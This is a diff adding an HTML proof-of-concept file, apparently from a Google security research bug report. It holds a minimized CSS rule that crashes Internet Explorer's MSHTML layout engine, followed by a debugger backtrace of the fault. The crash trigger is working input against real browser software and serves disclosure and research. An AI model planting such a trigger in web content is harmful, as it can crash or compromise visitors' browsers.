@@ -1,0 +1,81 @@
+<!--
+
+Source: https://code.google.com/p/google-security-research/issues/detail?id=677
+
+Minimized PoC:
+
+-->
+
+<style type="text/css">
+*:before {
+  content:counter(counter-0) close-quote url(?);
+  column-count:1;
+  position:fixed;
+}
+</style>
+
+<!--
+
+Backtrace for reference:
+
+2:051:x86> k
+ChildEBP RetAddr
+0c2c9688 60ca029e MSHTML!Layout::LayoutBuilderDriver::BuildPageLayout+0x6f2093
+0c2c974c 60c9fe17 MSHTML!Layout::PageCollection::FormatPage+0x167
+0c2c9854 60caad7e MSHTML!Layout::PageCollection::LayoutPagesCore+0x2c3
+0c2c9880 60caac9f MSHTML!Layout::PageCollection::LayoutPages+0xca
+0c2c9938 60caa49c MSHTML!CMarkupPageLayout::CalcPageLayoutSize+0x3b8
+0c2c99c0 61295d6e MSHTML!CMarkupPageLayout::CalcTopLayoutSize+0xec
+0c2c9a04 60c8c52f MSHTML!CView::EnsureSize+0x224
+0c2c9a5c 610977ce MSHTML!CView::EnsureView+0x3a5
+0c2c9b10 60dd92ab MSHTML!CDoc::RunningToInPlace+0x1b4
+0c2c9b30 60dfaabe MSHTML!CServer::TransitionTo+0x50
+0c2c9b48 62118e72 MSHTML!CServer::Show+0x50
+0c2c9b68 62118d61 IEFRAME!CDocObjectHost::_ShowMsoView+0xd8
+0c2c9b84 6109585d IEFRAME!CDocObjectHost::ActivateMe+0x31
+0c2c9ba8 610957d1 MSHTML!CServer::ActivateView+0x81
+0c2c9bd8 6109577b MSHTML!CServer::DoUIActivate+0x21
+0c2c9c0c 60df9e59 MSHTML!CServer::DoVerb+0x77
+0c2c9c4c 60df9e0e MSHTML!CMarkup::Navigate+0x3b
+0c2c9c5c 62118f52 MSHTML!CDoc::Navigate+0x1e
+0c2c9ca0 62273041 IEFRAME!CDocObjectHost::_ActivateMsoView+0x8f
+0c2c9cc0 620b51c0 IEFRAME!CDocObjectHost::UIActivate+0x4c
+0c2c9cd8 62272f7d IEFRAME!CDocObjectView::UIActivate+0x20
+0c2c9d04 620dc130 IEFRAME!CBaseBrowser2::_UIActivateView+0xa5
+0c2cbdd0 620e464c IEFRAME!CBaseBrowser2::v_ActivatePendingView+0x200
+0c2cbdf0 620e01a4 IEFRAME!CShellBrowser2::v_ActivatePendingView+0x2c
+0c2cbe0c 620e00c9 IEFRAME!CBaseBrowser2::_ExecShellDocView+0xcb
+0c2cbe40 6209bf4c IEFRAME!CBaseBrowser2::Exec+0x20c
+0c2cc0d0 620dafd5 IEFRAME!CShellBrowser2::Exec+0xdd
+0c2cc108 620d9a4b IEFRAME!CDocObjectHost::_Navigate+0x50
+0c2cc338 620da7f2 IEFRAME!CDocObjectHost::_OnReadyState+0x13c
+0c2cc398 620da728 IEFRAME!CDocObjectHost::_OnChangedReadyState+0xc6
+0c2cc3a0 60d9c704 IEFRAME!CDocObjectHost::OnChanged+0x1b
+0c2cc3f0 60d82967 MSHTML!CBase::FirePropertyNotify+0x106
+0c2cc414 60d8869c MSHTML!CMarkup::SetReadyState+0x85
+0c2cc5b8 60d8d5ee MSHTML!CMarkup::SetInteractiveInternal+0x2bc
+0c2cc5ec 60d8de5e MSHTML!CMarkup::RequestReadystateInteractive+0x92
+0c2cc618 60d7cfea MSHTML!CMarkup::BlockScriptExecutionHelper+0xf7
+0c2cc74c 60d83a78 MSHTML!CHtmPost::Exec+0xa1c
+0c2cc76c 60d839de MSHTML!CHtmPost::Run+0x3d
+0c2cc78c 60d8c2c3 MSHTML!PostManExecute+0x61
+0c2cc7a0 60d8d0f8 MSHTML!PostManResume+0x7b
+0c2cc7d0 60d4a45d MSHTML!CHtmPost::OnDwnChanCallback+0x38
+0c2cc7e8 60c6d55b MSHTML!CDwnChan::OnMethodCall+0x2f
+0c2cc830 60c6cc72 MSHTML!GlobalWndOnMethodCall+0x17b
+0c2cc884 757d8e71 MSHTML!GlobalWndProc+0x103
+0c2cc8b0 757d90d1 user32!_InternalCallWinProc+0x2b
+0c2cc944 757da62a user32!UserCallWinProcCheckWow+0x18e
+0c2cc9b8 757da680 user32!DispatchMessageWorker+0x473
+0c2cc9c4 6207a77c user32!DispatchMessageW+0x10
+0c2cfb94 620edf88 IEFRAME!CTabWindow::_TabWindowThreadProc+0x464
+0c2cfc54 7201ebec IEFRAME!LCIETab_ThreadProc+0x3e7
+0c2cfc6c 67d73a31 iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1c
+0c2cfca4 67f99608 IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x94
+WARNING: Stack unwind information not available. Following frames may be wrong.
+0c2cfce0 75a77c04 vfbasics+0x19608
+0c2cfcf4 77a1ad5f KERNEL32!BaseThreadInitThunk+0x24
+0c2cfd3c 77a1ad2a ntdll_779c0000!__RtlUserThreadStart+0x2f
+0c2cfd4c 00000000 ntdll_779c0000!_RtlUserThreadStart+0x1b
+
+-->
